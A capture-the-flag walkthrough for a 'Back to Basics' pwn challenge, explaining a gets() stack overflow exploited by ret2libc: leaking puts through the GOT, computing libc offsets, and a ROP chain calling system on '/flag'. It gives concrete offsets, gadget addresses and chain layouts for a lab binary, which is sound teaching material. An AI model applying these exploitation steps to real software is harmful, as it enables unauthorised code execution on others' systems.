---
title: Back to Basics
category: pwn
ctf: CUTS CTF 2026
author: Pwnzer
---

# back to basics — walkthrough

## 🧠 idea

simple **stack buffer overflow → ret2libc**

goal:

- leak libc
    
- call `system("/flag")`
    
- print flag
    

---

## 🔍 binary analysis

### protections

- no canary ❌
    
- no pie ❌ (fixed addresses)
    
- nx ✅ (no shellcode → use rop)
    

### vuln function

```c
char buf[64];
gets(buf);        // overflow
printf("Hello, %s!", buf);
```

👉 overflow offset:

```
64 (buffer) + 8 (saved rbp) = 72
```

---

## ⚙️ useful gadgets

from binary:

```
pop rdi; ret = 0x40116a
ret           = 0x40116b
```

---

## 🧩 exploit plan

### stage 1 — leak libc

we leak `puts` address:

```text
puts(puts@got)
```

rop:

```
"A"*72
pop rdi
puts@got
puts@plt
vuln   (loop back)
```

---

### 📤 leak result

example:

```
puts = 0x7c86b0fb65a0
```

---

### stage 2 — calculate libc

known offsets (glibc 2.41):

```
puts   = 0x805a0
system = 0x53110
```

compute:

```
libc_base = puts_leak - puts_off
system    = libc_base + system_off
```

---

## ❗ important discovery

- `/flag` is **NOT a file**
    
- it is a **binary program**
    

👉 running:

```
cat /flag
```

prints ELF garbage

👉 correct:

```
/flag
```

this program internally reads `/root/flag.txt`

---

## 🚀 stage 3 — final exploit

write command into memory:

```
gets(bss) → "/flag"
system(bss)
```

rop:

```
"A"*72
ret                # alignment
pop rdi → bss
gets@plt
ret
pop rdi → bss
system
```

then send:

```
/flag
```

---

## 💥 result

```
CUTS{r3t2l1bc_y0u_kn0w_y0ur_rop}
```

---

## 🧠 key lessons

- buffer overflow → control RIP
    
- ret2libc when NX is enabled
    
- always leak libc instead of guessing
    
- **check what target actually is**
    
    - `/flag` ≠ text file
        
- alignment matters (`ret`)
    

---

## ⚡ ultra short summary

```
overflow → leak puts → calc libc → system("/flag") → win
```